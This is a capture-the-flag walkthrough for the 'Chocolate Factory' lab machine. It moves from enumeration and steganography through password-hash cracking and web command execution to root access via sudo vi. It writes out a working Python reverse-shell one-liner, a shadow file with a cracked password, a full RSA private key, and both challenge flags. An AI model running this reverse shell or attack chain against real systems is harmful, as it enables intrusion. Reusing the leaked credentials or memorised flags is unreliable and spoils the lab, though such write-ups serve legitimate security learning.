# Chocolate Factory


1. Enumerate with nmap. We see many ports open with much of the same content, but on port 113 we see `http://localhost/key_rev_key <- You will find the key here!!!`. Navigate to `http://<ip address>/key_rev_key` and we download the file. Use `file key_rev_key` and we see it's an ELF executable file, so make it executable with `chmod +x key_rev_key` and run it. It asks for a name, but when we try any name (like `charlie`) we get the output `Bad name!`. Instead of guessing names, we can just use a text editor to view the contents of the file, and we find the key is `-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=`. We can also use the strings program to get all the strings from the file

2. First, we see that ftp has anonymous login allowed, so let's login as anonymous with `ftp <ip address>`. Use `ls` and we find a jpg file called `gum_room.jpg`. Download it with `get gum_room.jpg`, and we see it's a picture of doublemint gum. Use exiftool, but we don't find anything interesting. Try using steghide to find any hidden files `steghide extract -sf gum_room.jpg`, and we find a file was extracted with no password. b64 probably stands for base64, so we use cyberchef to decode it. We find the contents of /etc/shadow, and we have the hash for charlie's password
```
daemon:*:18380:0:99999:7:::
bin:*:18380:0:99999:7:::
sys:*:18380:0:99999:7:::
sync:*:18380:0:99999:7:::
games:*:18380:0:99999:7:::
man:*:18380:0:99999:7:::
lp:*:18380:0:99999:7:::
mail:*:18380:0:99999:7:::
news:*:18380:0:99999:7:::
uucp:*:18380:0:99999:7:::
proxy:*:18380:0:99999:7:::
www-data:*:18380:0:99999:7:::
backup:*:18380:0:99999:7:::
list:*:18380:0:99999:7:::
irc:*:18380:0:99999:7:::
gnats:*:18380:0:99999:7:::
nobody:*:18380:0:99999:7:::
systemd-timesync:*:18380:0:99999:7:::
systemd-network:*:18380:0:99999:7:::
systemd-resolve:*:18380:0:99999:7:::
_apt:*:18380:0:99999:7:::
mysql:!:18382:0:99999:7:::
tss:*:18382:0:99999:7:::
shellinabox:*:18382:0:99999:7:::
strongswan:*:18382:0:99999:7:::
ntp:*:18382:0:99999:7:::
messagebus:*:18382:0:99999:7:::
arpwatch:!:18382:0:99999:7:::
Debian-exim:!:18382:0:99999:7:::
uuidd:*:18382:0:99999:7:::
debian-tor:*:18382:0:99999:7:::
redsocks:!:18382:0:99999:7:::
freerad:*:18382:0:99999:7:::
iodine:*:18382:0:99999:7:::
tcpdump:*:18382:0:99999:7:::
miredo:*:18382:0:99999:7:::
dnsmasq:*:18382:0:99999:7:::
redis:*:18382:0:99999:7:::
usbmux:*:18382:0:99999:7:::
rtkit:*:18382:0:99999:7:::
sshd:*:18382:0:99999:7:::
postgres:*:18382:0:99999:7:::
avahi:*:18382:0:99999:7:::
stunnel4:!:18382:0:99999:7:::
sslh:!:18382:0:99999:7:::
nm-openvpn:*:18382:0:99999:7:::
nm-openconnect:*:18382:0:99999:7:::
pulse:*:18382:0:99999:7:::
saned:*:18382:0:99999:7:::
inetsim:*:18382:0:99999:7:::
colord:*:18382:0:99999:7:::
i2psvc:*:18382:0:99999:7:::
dradis:*:18382:0:99999:7:::
beef-xss:*:18382:0:99999:7:::
geoclue:*:18382:0:99999:7:::
lightdm:*:18382:0:99999:7:::
king-phisher:*:18382:0:99999:7:::
systemd-coredump:!!:18396::::::
_rpc:*:18451:0:99999:7:::
statd:*:18451:0:99999:7:::
_gvm:*:18496:0:99999:7:::
charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
```

3. Crack charlie's hash using hashcat. Copy the hash `$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/` into a file (let's call it `hash.txt`) and use `hashcat -a 0 -m 1800 hash.txt rockyou.txt`. We find that charlie's password is `cn7824`
`$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:cn7824`

4. We try logging into ssh with `ssh charlie@<ip address>`, but the password doesn't work. We know that port 80 is open and is probably running a web server, and once we visit it we see that it has a login page. Log in as `charlie` with the password and it takes us to a page where we can execute commands. Use `whoami` to see what we're logged in as, and we find `www-data`. We want to log in as charlie, so we use `su charlie`, but it doesn't work, which we verify with `whoami` again. Changing directories doesn't seem to work either, and the working directory seems to reset to ` /var/www/html ` each time we run a command. I bypassed this by using `&&`, so if I execute `cd /home/charlie && ls` I'm able to view the contents of charlie's directory. When I try to view user.txt, however, I find that I have to be logged in as charlie to read it

5. Let's try using a reverse shell. Run this command, listen with netcat, and we have a reverse shell! Stabilize the shell with `python -c 'import pty; pty.spawn("/bin/bash")'`, and then use `su charlie` and enter the password to log in as charlie, and..... it doesn't work. Let's `cd /home/charlie` to see if we can find anything.
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

6. If we use `ls -al` on charlie's home directory, we see that we have read permissions to `teleport` and `teleport.pub`, but not to user.txt. We find that they're the public and private keys to log in as charlie with ssh. Using [this](https://docs.rackspace.com/support/how-to/logging-in-with-an-ssh-private-key-on-linuxmac/) guide, we copy the private key into a file, change the file permissions, and then use the -i option in ssh to login with the private key as charlie. Now we can go to `/home/charlie` and `cat user.txt` to find `flag{cd5509042371b34e4826e4838b522d2e}`
```
-rw-r--r-- 1 charlie charley 1675 Oct  6  2020 teleport
-rw-r--r-- 1 charlie charley  407 Oct  6  2020 teleport.pub
-rw-r----- 1 charlie charley   39 Oct  6  2020 user.txt
```
```
www-data@chocolate-factory:/home/charlie$ cat teleport
cat teleport
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW
1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb
L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj
B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY
fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE
RaObPlb0dRy3KoN79lt+dh+jSg/dM/TYYe5L4wIDAQABAoIBAD2TzjQDYyfgu4Ej
Di32Kx+Ea7qgMy5XebfQYquCpUjLhK+GSBt9knKoQb9OHgmCCgNG3+Klkzfdg3g9
zAUn1kxDxFx2d6ex2rJMqdSpGkrsx5HwlsaUOoWATpkkFJt3TcSNlITquQVDe4tF
w8JxvJpMs445CWxSXCwgaCxdZCiF33C0CtVw6zvOdF6MoOimVZf36UkXI2FmdZFl
kR7MGsagAwRn1moCvQ7lNpYcqDDNf6jKnx5Sk83R5bVAAjV6ktZ9uEN8NItM/ppZ
j4PM6/IIPw2jQ8WzUoi/JG7aXJnBE4bm53qo2B4oVu3PihZ7tKkLZq3Oclrrkbn2
EY0ndcECgYEA/29MMD3FEYcMCy+KQfEU2h9manqQmRMDDaBHkajq20KvGvnT1U/T
RcbPNBaQMoSj6YrVhvgy3xtEdEHHBJO5qnq8TsLaSovQZxDifaGTaLaWgswc0biF
uAKE2uKcpVCTSewbJyNewwTljhV9mMyn/piAtRlGXkzeyZ9/muZdtesCgYEA4idA
KuEj2FE7M+MM/+ZeiZvLjKSNbiYYUPuDcsoWYxQCp0q8HmtjyAQizKo6DlXIPCCQ
RZSvmU1T3nk9MoTgDjkNO1xxbF2N7ihnBkHjOffod+zkNQbvzIDa4Q2owpeHZL19
znQV98mrRaYDb5YsaEj0YoKfb8xhZJPyEb+v6+kCgYAZwE+vAVsvtCyrqARJN5PB
la7Oh0Kym+8P3Zu5fI0Iw8VBc/Q+KgkDnNJgzvGElkisD7oNHFKMmYQiMEtvE7GB
FVSMoCo/n67H5TTgM3zX7qhn0UoKfo7EiUR5iKUAKYpfxnTKUk+IW6ME2vfJgsBg
82DuYPjuItPHAdRselLyNwKBgH77Rv5Ml9HYGoPR0vTEpwRhI/N+WaMlZLXj4zTK
37MWAz9nqSTza31dRSTh1+NAq0OHjTpkeAx97L+YF5KMJToXMqTIDS+pgA3fRamv
ySQ9XJwpuSFFGdQb7co73ywT5QPdmgwYBlWxOKfMxVUcXybW/9FoQpmFipHsuBjb
Jq4xAoGBAIQnMPLpKqBk/ZV+HXmdJYSrf2MACWwL4pQO9bQUeta0rZA6iQwvLrkM
Qxg3lN2/1dnebKK5lEd2qFP1WLQUJqypo5TznXQ7tv0Uuw7o0cy5XNMFVwn/BqQm
G2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln
-----END RSA PRIVATE KEY-----
```
```
www-data@chocolate-factory:/home/charlie$ cat teleport.pub
cat teleport.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDhp2s9zdSH3xFgOtnwJQEOBYsQ1TJsXrSUyT1hA4ENH6Cm5FbUDMvXYrfn8yLdXC2nQ1LCaVLuFrjL2y/aQ9e/yUU6YuLUVXaGqVA8vD+6ecQXBRsvgoGoF6YgN59XmnEyYKqqC4lciTOSUAhc1iF/EuvxwFL8cmiH/uqYuqsOhc2HBiMHfOCi/tFS2TXkm/XUPQi2zKvnim9iEJCB2iitTuXjYRklrIiiYcqifWOSh93X+hh84HCDPok6U0fWMUmjIhmDY6YSGdKNSW1n2ZLOZDK/czgA5FCjdl4tv7NudInJwQRFo5s+VvR1HLcqg3v2W352H6NKD90z9Nhh7kvj charlie@chocolate-factory
```

7. Now we want to escalate our privileges. Use `sudo -l` to see if there are any commands we can run as root, and we find that we can run `vi` as root. Use `sudo vi` to enter vim. Then we can use vim's built in terminal by typing in `:term` and hitting enter. We can make sure that we're root with `whoami`. Navigate to the root folder with `cd /root`. We see that there's a file called `root.py`. We try to run it with python3, but get an error. The hint says to use python instead, so we use it, enter the key we found earlier `b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='` and get `flag{cec59161d338fef787fcb4e296b42124}`
```
charlie@chocolate-factory:/home/charlie$ sudo -l
Matching Defaults entries for charlie on chocolate-factory:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User charlie may run the following commands on chocolate-factory:
    (ALL : !root) NOPASSWD: /usr/bin/vi

```
